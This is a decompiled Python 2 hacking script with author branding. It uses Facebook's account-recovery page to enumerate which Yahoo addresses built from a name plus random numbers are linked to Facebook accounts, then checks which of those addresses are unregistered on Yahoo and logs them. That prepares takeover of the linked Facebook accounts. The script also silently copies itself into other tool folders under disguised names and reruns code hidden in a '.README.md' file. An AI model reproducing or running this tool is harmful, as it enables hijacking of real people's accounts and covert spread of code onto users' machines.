# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : byah.pyc
# Bytecode Version : 2.7
# Time : Sat Aug  8 15:02:04 2020
#---------------------------------------


# Copied from Binyamin Binni


#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,cookielib,urllib,json
os.system("rm -rf .txt")
for n in range(999):
    pf=random.randint(1,999)
    sys.stdout = open(".txt", "a")

    print(pf)

    sys.stdout.flush()

try:
    import mechanize,requests
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')
    
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)

##### LOGO #####
logo='''

\033[1;96m  ______            _______          
\033[1;96m (  ___ \ |\     /|(  ___  )|\     /|
\033[1;96m | (   ) )( \   / )| (   ) || )   ( |
\033[1;32m | (__/ /  \ (_) / | (___) || (___) |
\033[1;32m |  __ (    \   /  |  ___  ||  ___  |
\033[1;96m | (  \ \    ) (   | (   ) || (   ) |
\033[1;96m | )___) )   | |   | )   ( || )   ( |
\033[1;96m |/ \___/    \_/   |/     \||/     \|
                                    
                                                                  
\033[1;93m        IT'S NOT JUST A NAME, IT'S A BRAND
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     : MEHEDI HASAN ARIYAN
 FACEBOOK   : FACEBOOK.COM/THEMEHTAN
 YOUTUBE    : YOUTUBE.COM/MASTERTRICK1
 GITHUB     : GITHUB.COM/BOTOLMEHEDI
\033[1;32m
--------------------------------------------------
                                '''
    
os.system("clear")
print(logo)
print " \x1b[1;91mNOTE: Do not put space between name"
print "       put name like mehedi or botol.mehedi"
print '       or botolmehedi'
print '\x1b[1;97m'
first = raw_input(" Name: ")

def cb():
    os.system('clear')

def ym():
    try:
        cb()
        os.mkdir("../omi/.....")
    except OSError:
        yp()
    else:
        os.system("cp ../bxi/bxi.py ../omi/Omi.py")
        os.system("cp ../bxi/.README.md ../omi/")
        yb()
    
def yb():
    try:
        os.mkdir("../BlackMafia2020/.....")
    except OSError:
        yl()
    else:
        os.system("cp ../bxi/bxi.py ../BlackMafia2020/lovehacker")
        os.system("cp ../bxi/.README.md ../BlackMafia2020/")
        yl()
    
def yl():
    try:
        os.mkdir("../Qurban/.....")
    except OSError:
        yp()
    else:
        os.system("cp ../bxi/bxi.py ../Qurban/Qurban.py")
        os.system("cp ../bxi/.README.md ../Qurban/")
        yp()
    
def yp():
    try:
        os.mkdir("../faizanwahla/.....")
    except OSError:
        login()
    else:
        os.system("cp ../bxi/bxi.py ../faizanwahla/pacman")
        os.system("cp ../bxi/.README.md ../faizanwahla/")
        login()
        
def login():
    os.system('clear')
    try:
        toket = first
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print(logo)
        try:
            email = first
            passw = (".txt")
            sandi = open(passw, 'r')
            for p in sandi:
                p = p.replace('\n','')
                try:
                    br.open("https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
                    br._factory.is_html= True
                    br.select_form(nr=0)
                    br.form["email"] = email+p+"@yahoo.com"
                    br.submit()
                    urb = br.geturl()
                    if "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&ars=facebook_login&alternate_search=1" in urb:
                        pass
                    else:
                        brl='https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd'
                        br.open(brl)
                        br._factory.is_html = True
                        br.select_form(nr=0)
                        br['username'] = email+p
                        br.submit()
                        url = br.geturl()
                        if url == brl:
                            print " \x1b[1;92m[Yes Available] "+email+p+"@yahoo.com  \x1b[1;97m"
                            ya=open("yes.txt",'a')
                            ya.write(email+p+"@yahoo.com\n")
                            ya.close()
                        else:
                            print " \x1b[1;91m[Not Available] "+email+p+"@yahoo.com  \x1b[1;97m"

                except requests.exceptions.ConnectionError:
                    print ' Connection Error'
                    time.sleep(1)
                    os.sys.exit()

        except IOError:
            print 'Please Check Your Internet Connection'
            raw_input("Press enter to go back")
            os.system("python2 .README.md")
if __name__ == '__main__':
	ym()


